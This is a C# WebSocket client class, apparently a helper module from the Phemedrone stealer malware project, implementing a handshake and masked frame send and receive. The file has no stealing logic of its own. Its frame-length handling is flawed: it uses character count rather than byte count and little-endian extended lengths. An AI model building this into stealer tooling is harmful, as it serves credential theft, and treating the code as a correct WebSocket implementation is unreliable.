using System;
using System.IO;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;

namespace PhemedroneStealer.Extensions
{
    public class WebSocketClient : IDisposable
    {
        private readonly TcpClient _tcpClient;
        private NetworkStream _stream;

        private string _host;
        private ushort _port;

        public WebSocketClient(string url, ushort port)
        {
            _tcpClient = new TcpClient(url, port);
            _stream = _tcpClient.GetStream();
            _host = url;
            _port = port;
        }

        public bool Handshake(string path)
        {
            var request = $"GET {path} HTTP/1.1\r\n" +
                          $"Host: {_host}:{_port}\r\n" +
                          "Upgrade: websocket\r\n" +
                          "Connection: Upgrade\r\n" +
                          "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n" +
                          "Sec-WebSocket-Version: 13\r\n" +
                          "\r\n";

            var requestBytes = Encoding.UTF8.GetBytes(request);

            _stream.Write(requestBytes, 0, requestBytes.Length);
            _stream.Flush();

            return ReadHandshakeResponse();
        }

        public void SendMessage(string message)
        {
            var messageBytes = Encoding.UTF8.GetBytes(message);
            var messageLength = message.Length;

            using (var memoryStream = new MemoryStream())
            {
                memoryStream.WriteByte(0x81); // 10000001 => FIN = 1, RSV1-3 = 0, Opcode = 1

                var maskKey = new byte[4];

                var rng = RandomNumberGenerator.Create();
                rng.GetBytes(maskKey);

                if (messageLength <= 125)
                {
                    memoryStream.WriteByte((byte)(0x80 | messageLength));
                }
                else if (messageLength <= 65535)
                {
                    memoryStream.WriteByte(0xFE);
                    memoryStream.Write(BitConverter.GetBytes((ushort)messageLength), 0, 2);
                }
                else
                {
                    memoryStream.WriteByte(0xFF);
                    memoryStream.Write(BitConverter.GetBytes((ulong)messageLength), 0, 8);
                }

                memoryStream.Write(maskKey, 0, maskKey.Length);

                for (var i = 0; i < messageBytes.Length; i++)
                {
                    messageBytes[i] ^= maskKey[i % 4];
                }

                memoryStream.Write(messageBytes, 0, messageBytes.Length);

                var frame = memoryStream.ToArray();

                _stream.Write(frame, 0, frame.Length);
                _stream.Flush();
            }
        }


        public string ReceiveMessage()
        {
            var buffer = new byte[2];
            _stream.Read(buffer, 0, 2);

            var isMasked = (buffer[1] & 0x80) != 0;
            var payloadLength = buffer[1] & 0x7F;

            switch (payloadLength)
            {
                case 126:
                    buffer = new byte[2];
                    _stream.Read(buffer, 0, 2);
                    Array.Reverse(buffer);
                    payloadLength = BitConverter.ToUInt16(buffer, 0);
                    break;
                case 127:
                    buffer = new byte[8];
                    _stream.Read(buffer, 0, 8);
                    Array.Reverse(buffer);
                    payloadLength = (int)BitConverter.ToUInt64(buffer, 0);
                    break;
            }

            var maskingKey = new byte[4];
            if (isMasked)
                _stream.Read(maskingKey, 0, 4);

            var payloadData = new byte[payloadLength];
            var payloadBytesRead = 0;
            while (payloadBytesRead < payloadLength)
            {
                var bytesRead = _stream.Read(payloadData, payloadBytesRead, payloadLength - payloadBytesRead);
                payloadBytesRead += bytesRead;
            }


            for (var i = 0; i < payloadLength && isMasked; i++)
            {
                payloadData[i] ^= maskingKey[i % 4];
            }


            return Encoding.UTF8.GetString(payloadData); 
        }

        private bool ReadHandshakeResponse()
        {
            var buffer = new byte[1024];

            var bytesRead = _stream.Read(buffer, 0, buffer.Length);
            var response = Encoding.UTF8.GetString(buffer, 0, bytesRead);

            return response.Contains("HTTP/1.1 101");
        }

        public void Dispose()
        {
            _tcpClient.Close();
            _stream.Dispose();
        }
    }
}